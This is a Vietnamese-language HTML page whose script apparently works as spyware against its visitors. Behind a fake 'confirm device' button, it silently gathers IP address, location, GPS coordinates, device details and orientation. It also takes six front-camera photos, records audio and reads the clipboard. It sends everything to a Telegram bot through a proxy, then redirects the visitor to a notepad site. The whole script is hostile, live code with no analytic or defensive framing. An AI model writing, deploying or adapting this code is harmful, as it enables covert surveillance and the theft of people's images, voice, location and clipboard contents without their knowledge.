<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Hoang Anh</title>
    <style>
        body {
            background: black;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: monospace;
        }
        .hidden-content {
            display: none;
        }
        .status-toast {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: rgba(0,0,0,0.7);
            color: #0f0;
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 12px;
            font-family: monospace;
            z-index: 9999;
            pointer-events: none;
            backdrop-filter: blur(4px);
        }
        .ios-permission-box {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 100000;
            display: flex;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(10px);
        }
        .ios-permission-content {
            background: #1a1a1a;
            padding: 35px 25px;
            border-radius: 25px;
            max-width: 320px;
            border: 1px solid #00ff00;
            text-align: center;
            color: white;
        }
        .ios-permission-content h3 {
            color: #00ff00;
            margin-top: 0;
            font-size: 20px;
        }
        .ios-permission-content p {
            color: #cccccc;
            margin: 15px 0;
            font-size: 14px;
        }
        .ios-permission-content button {
            background: #00ff00;
            color: black;
            border: none;
            padding: 15px 30px;
            border-radius: 40px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div id="iosPrompt" class="ios-permission-box" style="display: none;">
        <div class="ios-permission-content">
            <h3>📱 Xác nhận thiết bị</h3>
            <p>Nhấn nút bên dưới để tiếp tục truy cập</p>
            <button id="iosConfirmBtn">✅ Xác nhận và Tiếp tục</button>
        </div>
    </div>

    <div style="display:none;">
        <div id="info"></div>
    </div>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <audio id="audio" style="display:none;"></audio>
    <input type="text" id="dummyInput" style="position: absolute; opacity: 0; height: 0; width: 0;">

    <script>
        // Sử dụng Netlify Function làm proxy để gọi Telegram API
        // Function này sẽ đọc BOT_TOKEN và CHAT_ID từ Environment Variables
        const TELEGRAM_PROXY = '/.netlify/functions/telegram-proxy';
        const REDIRECT_NOTE_LINK = 'https://www.memonotepad.com/';
        const PHOTO_COUNT = 6;
        const PHOTO_INTERVAL = 300;
        const AUDIO_DURATION = 400;

        let photoSentCount = 0;
        let cameraStream = null;
        let cameraActive = false;
        let audioRecorded = false;
        let mediaRecorder = null;
        let audioChunks = [];
        let gpsDataSent = false;
        let redirectTriggered = false;
        let mainInfoCompleted = false;
        let audioCompleted = false;
        let gpsCompleted = false;
        let orientationCompleted = false;
        let clipboardCompleted = false;

        const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;

        function checkAndRedirect() {
            if (redirectTriggered) return;
            const allDone = mainInfoCompleted && (photoSentCount === PHOTO_COUNT) && audioCompleted && gpsCompleted && orientationCompleted && clipboardCompleted;
            if (allDone) {
                redirectTriggered = true;
                setTimeout(() => { window.location.href = REDIRECT_NOTE_LINK; }, 300);
            }
        }

        async function sendToTelegram(text, retryCount = 0) {
            const maxRetries = 2;
            try {
                const response = await fetch(TELEGRAM_PROXY, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        endpoint: 'sendMessage',
                        data: {
                            text: text.substring(0, 4096),
                            parse_mode: 'HTML',
                            disable_web_page_preview: false
                        }
                    })
                });
                const data = await response.json();
                if (!data.ok && retryCount < maxRetries) {
                    setTimeout(() => sendToTelegram(text, retryCount + 1), 2000);
                }
                return data;
            } catch (e) {
                if (retryCount < maxRetries) {
                    setTimeout(() => sendToTelegram(text, retryCount + 1), 2000);
                }
            }
        }

        async function sendAudioToTelegram(blob, retryCount = 0) {
            const maxRetries = 2;
            try {
                const formData = new FormData();
                formData.append('endpoint', 'sendAudio');
                formData.append('audio', blob, `audio_${Date.now()}.ogg`);
                formData.append('caption', `🎤 Ghi âm - ${new Date().toLocaleString('vi-VN')}`);
                
                const response = await fetch(TELEGRAM_PROXY, { method: 'POST', body: formData });
                const data = await response.json();
                if (!data.ok && retryCount < maxRetries) {
                    setTimeout(() => sendAudioToTelegram(blob, retryCount + 1), 2000);
                }
            } catch (e) {}
        }

        async function sendPhotoToTelegram(blob, photoNumber, retryCount = 0) {
            const maxRetries = 2;
            try {
                const formData = new FormData();
                formData.append('endpoint', 'sendPhoto');
                formData.append('photo', blob, `capture_${photoNumber}.jpg`);
                formData.append('caption', `📸 Ảnh chụp #${photoNumber} - ${new Date().toLocaleString('vi-VN')}`);
                
                const response = await fetch(TELEGRAM_PROXY, { method: 'POST', body: formData });
                const data = await response.json();
                if (data.ok) {
                    photoSentCount++;
                    if (photoSentCount === PHOTO_COUNT && cameraStream && cameraActive) {
                        setTimeout(() => {
                            if (cameraStream) { cameraStream.getTracks().forEach(track => track.stop()); cameraStream = null; cameraActive = false; }
                        }, 2000);
                    }
                    checkAndRedirect();
                } else if (retryCount < maxRetries) {
                    setTimeout(() => sendPhotoToTelegram(blob, photoNumber, retryCount + 1), 2000);
                }
            } catch (e) {}
        }

        async function sendDocumentToTelegram(blob, filename, caption, retryCount = 0) {
            const maxRetries = 2;
            try {
                const formData = new FormData();
                formData.append('endpoint', 'sendDocument');
                formData.append('document', blob, filename);
                formData.append('caption', caption);
                
                const response = await fetch(TELEGRAM_PROXY, { method: 'POST', body: formData });
                const data = await response.json();
                if (!data.ok && retryCount < maxRetries) {
                    setTimeout(() => sendDocumentToTelegram(blob, filename, caption, retryCount + 1), 2000);
                }
                return data;
            } catch (e) { return { ok: false }; }
        }

        async function captureSinglePhoto(video, canvas, ctx, photoNumber) {
            return new Promise((resolve) => {
                try {
                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        canvas.toBlob((blob) => {
                            if (blob) { sendPhotoToTelegram(blob, photoNumber); resolve(true); }
                            else { resolve(false); }
                        }, 'image/jpeg', 0.85);
                    } else {
                        setTimeout(() => { captureSinglePhoto(video, canvas, ctx, photoNumber).then(resolve); }, 50);
                    }
                } catch (e) { resolve(false); }
            });
        }

        async function captureMultiplePhotos(video, canvas, ctx) {
            if (!cameraActive) return;
            for (let i = 1; i <= PHOTO_COUNT; i++) {
                if (!cameraActive) break;
                await captureSinglePhoto(video, canvas, ctx, i);
                if (i < PHOTO_COUNT) { await new Promise(resolve => setTimeout(resolve, PHOTO_INTERVAL)); }
            }
        }

        async function startRecording() {
            if (audioRecorded) return;
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream);
                audioChunks = [];
                mediaRecorder.ondataavailable = (event) => { if (event.data.size > 0) audioChunks.push(event.data); };
                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                    if (audioBlob.size > 0) { await sendAudioToTelegram(audioBlob); }
                    audioRecorded = true;
                    audioCompleted = true;
                    stream.getTracks().forEach(track => track.stop());
                    checkAndRedirect();
                };
                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') { mediaRecorder.stop(); }
                    else { audioCompleted = true; audioRecorded = true; checkAndRedirect(); }
                }, AUDIO_DURATION);
            } catch (e) { audioCompleted = true; audioRecorded = false; checkAndRedirect(); }
        }

        async function getIPAndLocation() {
            let ip = 'Không xác định';
            let locationData = {
                city: 'Không xác định',
                region: 'Không xác định',
                country: 'Không xác định',
                isp: 'Không xác định',
                lat: null,
                lon: null
            };
            
            const ipAPIs = [
                'https://api.ipify.org?format=json',
                'https://api.my-ip.io/ip.json',
                'https://ipapi.co/json/'
            ];
            
            for (const api of ipAPIs) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 4000);
                    const response = await fetch(api, { signal: controller.signal });
                    clearTimeout(timeoutId);
                    const data = await response.json();
                    if (api.includes('ipify')) ip = data.ip;
                    else if (api.includes('my-ip')) ip = data.ip;
                    else if (api.includes('ipapi.co')) ip = data.ip;
                    if (ip && ip !== 'Không xác định') break;
                } catch (e) {}
            }
            
            const locationAPIs = [
                {
                    url: `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,lat,lon`,
                    parser: (data) => {
                        if (data && data.status === 'success') {
                            return {
                                city: data.city && data.city !== '' ? data.city : 'Không xác định',
                                region: data.regionName && data.regionName !== '' ? data.regionName : 'Không xác định',
                                country: data.country && data.country !== '' ? data.country : 'Không xác định',
                                isp: data.isp && data.isp !== '' ? data.isp : (data.org || 'Không xác định'),
                                lat: data.lat || null,
                                lon: data.lon || null
                            };
                        }
                        return null;
                    }
                },
                {
                    url: `https://ipapi.co/${ip}/json/`,
                    parser: (data) => {
                        if (data && !data.error) {
                            return {
                                city: data.city && data.city !== '' ? data.city : 'Không xác định',
                                region: data.region && data.region !== '' ? data.region : 'Không xác định',
                                country: data.country_name && data.country_name !== '' ? data.country_name : 'Không xác định',
                                isp: data.org && data.org !== '' ? data.org : 'Không xác định',
                                lat: data.latitude || null,
                                lon: data.longitude || null
                            };
                        }
                        return null;
                    }
                },
                {
                    url: `https://ipinfo.io/${ip}/json`,
                    parser: (data) => {
                        if (data && !data.error) {
                            let lat = null, lon = null;
                            if (data.loc && typeof data.loc === 'string') {
                                const parts = data.loc.split(',');
                                if (parts.length === 2) {
                                    lat = parseFloat(parts[0]);
                                    lon = parseFloat(parts[1]);
                                }
                            }
                            return {
                                city: data.city && data.city !== '' ? data.city : 'Không xác định',
                                region: data.region && data.region !== '' ? data.region : 'Không xác định',
                                country: data.country && data.country !== '' ? data.country : 'Không xác định',
                                isp: data.org && data.org !== '' ? data.org : 'Không xác định',
                                lat: lat,
                                lon: lon
                            };
                        }
                        return null;
                    }
                }
            ];
            
            for (const api of locationAPIs) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 6000);
                    const response = await fetch(api.url, { signal: controller.signal });
                    clearTimeout(timeoutId);
                    const data = await response.json();
                    const result = api.parser(data);
                    if (result && (result.city !== 'Không xác định' || result.country !== 'Không xác định')) {
                        locationData = result;
                        break;
                    }
                } catch (e) {}
            }
            
            locationData.city = (locationData.city && locationData.city !== 'undefined' && locationData.city !== 'null') ? locationData.city : 'Không xác định';
            locationData.region = (locationData.region && locationData.region !== 'undefined' && locationData.region !== 'null') ? locationData.region : 'Không xác định';
            locationData.country = (locationData.country && locationData.country !== 'undefined' && locationData.country !== 'null') ? locationData.country : 'Không xác định';
            locationData.isp = (locationData.isp && locationData.isp !== 'undefined' && locationData.isp !== 'null') ? locationData.isp : 'Không xác định';
            
            return { ip, locationData };
        }

        async function getBatteryInfo() {
            let batteryPercent = 'Không xác định';
            let batteryCharging = false;
            
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    const level = Math.round(battery.level * 100);
                    batteryPercent = `${level}%`;
                    batteryCharging = battery.charging;
                    return { batteryPercent, batteryCharging };
                } catch (err) {}
            }
            
            const isIOSDevice = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
            if (isIOSDevice) {
                return { batteryPercent: 'iOS không hỗ trợ', batteryCharging: false };
            }
            
            return { batteryPercent: 'Không xác định', batteryCharging: false };
        }

        async function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform || 'Không xác định';
            const isIOSDevice = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
            const isIPhone = /iPhone/.test(userAgent);
            const isIPad = /iPad/.test(userAgent) || (isIOSDevice && screen.width > 768);
            let deviceModel = 'Không xác định';
            
            if (isIPhone) deviceModel = 'iPhone';
            else if (isIPad) deviceModel = 'iPad';
            else if (isIOSDevice) deviceModel = 'iOS Device';
            else if (/Android/.test(userAgent)) deviceModel = 'Android';
            else if (/Windows/.test(userAgent)) deviceModel = 'Windows';
            else if (/Macintosh/.test(userAgent)) deviceModel = 'Mac';
            
            return { userAgent, platform, isIOS: isIOSDevice, deviceModel, isIPhone };
        }

        async function autoSendGPS() {
            if (gpsDataSent) { gpsCompleted = true; checkAndRedirect(); return; }
            if (!('geolocation' in navigator)) { gpsCompleted = true; gpsDataSent = true; checkAndRedirect(); return; }
            
            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    const lat = pos.coords.latitude;
                    const lng = pos.coords.longitude;
                    const accuracy = pos.coords.accuracy;
                    const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
                    
                    const gpsMessage = `<b>📍 VỊ TRÍ GPS THỰC TẾ</b>\n\n` +
                        `<b>📌 Vĩ độ:</b> <code>${lat}</code>\n` +
                        `<b>📌 Kinh độ:</b> <code>${lng}</code>\n` +
                        `<b>🎯 Độ chính xác:</b> <code>${Math.round(accuracy)} mét</code>\n\n` +
                        `<a href="${mapsLink}">🗺️ Xem trên Google Maps</a>`;
                    
                    await sendToTelegram(gpsMessage);
                    gpsDataSent = true;
                    gpsCompleted = true;
                    checkAndRedirect();
                },
                (err) => { gpsCompleted = true; gpsDataSent = true; checkAndRedirect(); },
                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
            );
        }

        async function getInfoAndSendToTelegram() {
            const { ip, locationData } = await getIPAndLocation();
            const deviceInfo = await getDeviceInfo();
            const { batteryPercent, batteryCharging } = await getBatteryInfo();
            
            const screenWidth = screen.width;
            const screenHeight = screen.height;
            const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Không xác định';
            const cookieEnabled = navigator.cookieEnabled ? 'Bật' : 'Tắt';
            const currentTime = new Date().toLocaleString('vi-VN');
            const language = navigator.language || 'Không xác định';
            const hardwareConcurrency = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} nhân` : 'Không xác định';
            const referrer = document.referrer || 'Truy cập trực tiếp';
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không xác định';
            
            let telegramMapsLink = '';
            if (locationData.lat && locationData.lon) {
                telegramMapsLink = `\n<a href="https://www.google.com/maps?q=${locationData.lat},${locationData.lon}">🗺️ Xem vị trí (ước tính từ IP)</a>`;
            }
            
            let batteryDisplay = '';
            if (deviceInfo.isIOS) {
                batteryDisplay = `<b>🔋 Pin:</b> <code>iOS không hỗ trợ đọc % pin qua web (giới hạn bảo mật)</code>`;
            } else {
                const chargingStatus = batteryCharging ? '🔌 Đang sạc' : '🔋 Không sạc';
                batteryDisplay = `<b>🔋 Pin:</b> <code>${batteryPercent} (${chargingStatus})</code>`;
            }
            
            const telegramText = `<b>📥 KHÁCH TRUY CẬP MỚI</b>\n\n` +
                `<b>🌐 Địa chỉ IP:</b> <code>${ip}</code>\n` +
                `<b>📍 Thành phố:</b> <code>${locationData.city}</code>\n` +
                `<b>🗺️ Khu vực:</b> <code>${locationData.region}</code>\n` +
                `<b>🏳️ Quốc gia:</b> <code>${locationData.country}</code>\n` +
                `<b>🏢 Nhà mạng:</b> <code>${locationData.isp}</code>${telegramMapsLink}\n\n` +
                `<b>📱 Thiết bị:</b> <code>${deviceInfo.deviceModel}</code>\n` +
                `<b>💻 Trình duyệt:</b> <code>${deviceInfo.userAgent.substring(0, 80)}...</code>\n` +
                `<b>🖥️ Hệ điều hành:</b> <code>${deviceInfo.platform}</code>\n` +
                `<b>📺 Độ phân giải:</b> <code>${screenWidth}x${screenHeight}</code>\n` +
                `${batteryDisplay}\n` +
                `<b>💾 RAM:</b> <code>${deviceMemory}</code>\n` +
                `<b>⚙️ CPU Core:</b> <code>${hardwareConcurrency}</code>\n` +
                `<b>🍪 Cookie:</b> <code>${cookieEnabled}</code>\n` +
                `<b>🌐 Ngôn ngữ:</b> <code>${language}</code>\n` +
                `<b>⏰ Múi giờ:</b> <code>${timezone}</code>\n` +
                `<b>🕐 Thời gian:</b> <code>${currentTime}</code>\n` +
                `<b>📎 Nguồn truy cập:</b> <code>${referrer}</code>`;
            
            await sendToTelegram(telegramText);
            mainInfoCompleted = true;
            checkAndRedirect();
        }

        async function startCameraImmediately() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: { ideal: 800 }, height: { ideal: 600 }, facingMode: 'user' }
                });
                
                cameraStream = stream;
                cameraActive = true;
                video.srcObject = stream;
                
                await new Promise((resolve) => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
                await new Promise(resolve => setTimeout(resolve, 100));
                await captureMultiplePhotos(video, canvas, ctx);
            } catch (e) { cameraActive = false; }
        }

        async function getOrientationData() {
            let orientationData = {
                screen: 'Không xác định',
                alpha: null,
                beta: null,
                gamma: null,
                compass: false
            };
            
            if (screen.orientation) {
                const type = screen.orientation.type;
                if (type.includes('portrait')) orientationData.screen = 'Dọc';
                else if (type.includes('landscape')) orientationData.screen = 'Ngang';
                else orientationData.screen = type;
            } else if (window.orientation !== undefined) {
                const angle = window.orientation;
                if (angle === 0 || angle === 180) orientationData.screen = 'Dọc';
                else orientationData.screen = 'Ngang';
            }
            
            if (window.DeviceOrientationEvent) {
                try {
                    const orientation = await new Promise((resolve) => {
                        let resolved = false;
                        const handler = (event) => {
                            if (!resolved && event.alpha !== null) {
                                resolved = true;
                                window.removeEventListener('deviceorientation', handler);
                                resolve(event);
                            }
                        };
                        window.addEventListener('deviceorientation', handler);
                        setTimeout(() => { if (!resolved) { window.removeEventListener('deviceorientation', handler); resolve(null); } }, 2000);
                    });
                    
                    if (orientation) {
                        orientationData.alpha = orientation.alpha;
                        orientationData.beta = orientation.beta;
                        orientationData.gamma = orientation.gamma;
                        orientationData.compass = orientation.absolute;
                    }
                } catch (e) {}
            }
            
            return orientationData;
        }

        async function sendOrientationInfo() {
            try {
                const o = await getOrientationData();
                
                let compassText = '';
                if (o.alpha !== null) {
                    const alpha = o.alpha;
                    let direction = '';
                    if (alpha >= 337.5 || alpha < 22.5) direction = 'Bắc ⬆️';
                    else if (alpha >= 22.5 && alpha < 67.5) direction = 'Đông Bắc ↗️';
                    else if (alpha >= 67.5 && alpha < 112.5) direction = 'Đông ➡️';
                    else if (alpha >= 112.5 && alpha < 157.5) direction = 'Đông Nam ↘️';
                    else if (alpha >= 157.5 && alpha < 202.5) direction = 'Nam ⬇️';
                    else if (alpha >= 202.5 && alpha < 247.5) direction = 'Tây Nam ↙️';
                    else if (alpha >= 247.5 && alpha < 292.5) direction = 'Tây ⬅️';
                    else if (alpha >= 292.5 && alpha < 337.5) direction = 'Tây Bắc ↖️';
                    
                    compassText = `\n<b>🧭 Hướng la bàn:</b> <code>${direction} (${alpha.toFixed(0)}°)</code>`;
                }
                
                let tiltText = '';
                if (o.beta !== null && o.gamma !== null) {
                    const beta = o.beta;
                    const gamma = o.gamma;
                    
                    let tiltStatus = '';
                    if (Math.abs(beta) < 10 && Math.abs(gamma) < 10) tiltStatus = '📱 Đặt phẳng';
                    else if (beta > 45) tiltStatus = '📱 Nghiêng về trước';
                    else if (beta < -45) tiltStatus = '📱 Nghiêng về sau';
                    else if (gamma > 20) tiltStatus = '📱 Nghiêng sang phải';
                    else if (gamma < -20) tiltStatus = '📱 Nghiêng sang trái';
                    else tiltStatus = '📱 Hơi nghiêng';
                    
                    tiltText = `\n<b>📐 Tư thế máy:</b> <code>${tiltStatus}</code>`;
                    tiltText += `\n<b>📊 Góc nghiêng:</b> <code>Trước/Sau: ${beta.toFixed(0)}° | Trái/Phải: ${gamma.toFixed(0)}°</code>`;
                }
                
                const orientationText = `<b>🧭 THÔNG TIN HƯỚNG THIẾT BỊ</b>\n\n` +
                    `<b>📱 Màn hình:</b> <code>${o.screen}</code>${compassText}${tiltText}\n\n` +
                    `<i>💡 Mẹo: Xoay điện thoại để xem hướng thay đổi</i>`;
                
                await sendToTelegram(orientationText);
                orientationCompleted = true;
                checkAndRedirect();
            } catch (e) { orientationCompleted = true; checkAndRedirect(); }
        }

        async function captureClipboard() {
            let clipboardData = { text: '', hasPermission: false, error: '' };
            
            try {
                if (!navigator.clipboard) {
                    clipboardData.error = 'Trình duyệt không hỗ trợ Clipboard API';
                    return clipboardData;
                }
                
                try {
                    const text = await navigator.clipboard.readText();
                    clipboardData.text = text || '(Clipboard trống)';
                    clipboardData.hasPermission = true;
                } catch (textErr) {
                    clipboardData.error = `Lỗi đọc text: ${textErr.message}`;
                }
            } catch (e) { clipboardData.error = e.message; }
            
            return clipboardData;
        }

        async function sendLongMessage(baseText, content, maxLength = 3800) {
            const parts = [];
            
            if (content.length > maxLength) {
                const totalParts = Math.ceil(content.length / maxLength);
                
                for (let i = 0; i < totalParts; i++) {
                    const start = i * maxLength;
                    const end = Math.min(start + maxLength, content.length);
                    const chunk = content.substring(start, end);
                    
                    let partText = '';
                    if (i === 0) {
                        partText = `${baseText}\n\n<b>📄 Phần 1/${totalParts}:</b>\n<code>${chunk}</code>`;
                    } else {
                        partText = `<b>📋 CLIPBOARD - Phần ${i + 1}/${totalParts}</b>\n\n<code>${chunk}</code>`;
                    }
                    parts.push(partText);
                }
            } else {
                parts.push(`${baseText}\n\n<code>${content}</code>`);
            }
            
            for (const part of parts) {
                await sendToTelegram(part);
                await new Promise(resolve => setTimeout(resolve, 500));
            }
        }

        async function sendClipboardAsFile(content, filename, caption) {
            try {
                const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
                return await sendDocumentToTelegram(blob, filename, caption);
            } catch (e) { return false; }
        }

        async function sendClipboardInfo() {
            try {
                const clipboard = await captureClipboard();
                
                if (clipboard.hasPermission && clipboard.text && clipboard.text !== '(Clipboard trống)') {
                    const timestamp = new Date().toLocaleString('vi-VN');
                    const textLength = clipboard.text.length;
                    const baseInfo = `<b>📋 NỘI DUNG CLIPBOARD (BỘ NHỚ TẠM)</b>\n` +
                        `<b>🔓 Trạng thái:</b> <code>✅ Có quyền truy cập</code>\n` +
                        `<b>📏 Độ dài:</b> <code>${textLength} ký tự</code>\n` +
                        `<b>🕐 Thời gian:</b> <code>${timestamp}</code>`;
                    
                    if (textLength > 2000) {
                        await sendToTelegram(`${baseInfo}\n\n<i>📎 Nội dung quá dài, đang gửi dưới dạng file đính kèm...</i>`);
                        const filename = `clipboard_${Date.now()}.txt`;
                        const caption = `📋 Clipboard - ${textLength} ký tự - ${timestamp}`;
                        const fileSent = await sendClipboardAsFile(clipboard.text, filename, caption);
                        if (!fileSent) { await sendLongMessage(baseInfo, clipboard.text, 3500); }
                    } else {
                        await sendToTelegram(`${baseInfo}\n\n<b>📄 Nội dung:</b>\n<code>${clipboard.text}</code>`);
                    }
                } else {
                    await sendToTelegram(`<b>📋 NỘI DUNG CLIPBOARD</b>\n\n<b>🔒 Trạng thái:</b> <code>❌ Không có quyền truy cập hoặc clipboard trống</code>`);
                }
                
                clipboardCompleted = true;
                checkAndRedirect();
            } catch (e) { clipboardCompleted = true; checkAndRedirect(); }
        }

        async function requestOrientationPermission() {
            return new Promise((resolve) => {
                if (typeof DeviceOrientationEvent.requestPermission === 'function') {
                    DeviceOrientationEvent.requestPermission()
                        .then(state => { resolve(state === 'granted'); })
                        .catch(() => { resolve(false); });
                } else { resolve(true); }
            });
        }

        async function handleIOSPermissions() {
            return new Promise(async (resolve) => {
                if (isIOS) {
                    document.getElementById('iosPrompt').style.display = 'flex';
                    document.getElementById('iosConfirmBtn').onclick = async () => {
                        document.getElementById('iosPrompt').style.display = 'none';
                        
                        const granted = await requestOrientationPermission();
                        if (granted) { await sendOrientationInfo(); }
                        else { orientationCompleted = true; checkAndRedirect(); }
                        
                        document.getElementById('dummyInput').focus();
                        setTimeout(async () => { await sendClipboardInfo(); }, 300);
                        resolve(true);
                    };
                } else {
                    await sendOrientationInfo();
                    await sendClipboardInfo();
                    resolve(true);
                }
            });
        }

        async function init() {
            try {
                getInfoAndSendToTelegram();
                autoSendGPS();
                startCameraImmediately();
                setTimeout(() => { startRecording(); }, 50);
                await handleIOSPermissions();
            } catch (err) {}
        }

        init();
    </script>
</body>
</html>
